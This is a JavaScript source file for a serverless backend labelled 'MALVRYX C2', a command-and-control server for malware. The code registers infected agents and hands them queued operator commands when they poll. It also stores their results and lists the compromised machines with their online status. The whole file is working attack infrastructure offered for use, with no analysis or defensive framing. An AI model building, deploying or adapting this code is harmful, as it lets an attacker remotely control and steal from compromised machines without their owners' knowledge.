// ================================================================
// MALVRYX C2 — WORKING VERCEL BACKEND
// ================================================================

// Simple in-memory storage
const agents = {};
const commands = {};
const results = {};

module.exports = async function handler(req, res) {
    // CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    // Parse body
    let body = {};
    try {
        if (typeof req.body === 'string') {
            body = JSON.parse(req.body);
        } else if (req.body && typeof req.body === 'object') {
            body = req.body;
        }
    } catch (e) {
        body = {};
    }

    const { agent, command, data, agentId, args } = body;
    const path = req.url || '/';

    // ============================================================
    // REGISTER AGENT
    // ============================================================
    if (path === '/poll' && command === 'register') {
        const id = agent || 'agent_' + Date.now().toString(36);
        agents[id] = { id, info: data || {}, lastSeen: Date.now(), commandsExecuted: 0 };
        if (!commands[id]) commands[id] = [];
        return res.json({ status: 'registered', agentId: id });
    }

    // ============================================================
    // POLL FOR COMMANDS
    // ============================================================
    if (path === '/poll' && command === 'poll') {
        const id = agent;
        if (!agents[id]) return res.json({ error: 'Agent not found' });
        agents[id].lastSeen = Date.now();
        if (commands[id] && commands[id].length > 0) {
            const cmd = commands[id].shift();
            agents[id].commandsExecuted++;
            return res.json(cmd);
        }
        return res.json({ command: 'noop' });
    }

    // ============================================================
    // SEND RESULT
    // ============================================================
    if (path === '/poll' && (command === 'result' || command === 'error')) {
        const id = agent;
        if (agents[id]) {
            if (!results[id]) results[id] = [];
            results[id].push({ time: Date.now(), data });
        }
        return res.json({ status: 'ok' });
    }

    // ============================================================
    // GET AGENTS LIST
    // ============================================================
    if (path === '/api/agents' && req.method === 'GET') {
        const list = Object.keys(agents).map(id => ({
            id,
            info: agents[id].info,
            lastSeen: agents[id].lastSeen,
            commandsExecuted: agents[id].commandsExecuted,
            online: (Date.now() - agents[id].lastSeen) < 60000
        }));
        return res.json(list);
    }

    // ============================================================
    // SEND COMMAND (WORKING)
    // ============================================================
    if (path === '/api/send' && req.method === 'POST') {
        // Log what we received for debugging
        console.log('[SEND] Body:', body);
        
        if (!agentId) {
            return res.status(400).json({ error: 'agentId is required' });
        }
        if (!command) {
            return res.status(400).json({ error: 'command is required' });
        }
        if (!agents[agentId]) {
            return res.status(404).json({ error: 'Agent not found: ' + agentId });
        }

        if (!commands[agentId]) commands[agentId] = [];
        commands[agentId].push({ command, data, args });

        return res.json({
            status: 'queued',
            agentId: agentId,
            command: command,
            queueLength: commands[agentId].length
        });
    }

    // ============================================================
    // GET STATS
    // ============================================================
    if (path === '/api/stats' && req.method === 'GET') {
        return res.json({
            totalAgents: Object.keys(agents).length,
            onlineAgents: Object.keys(agents).filter(id => (Date.now() - agents[id].lastSeen) < 60000).length,
            totalCommands: Object.keys(agents).reduce((sum, id) => sum + agents[id].commandsExecuted, 0)
        });
    }

    // ============================================================
    // 404
    // ============================================================
    res.status(404).json({ error: 'Not found', path: path, method: req.method });
};
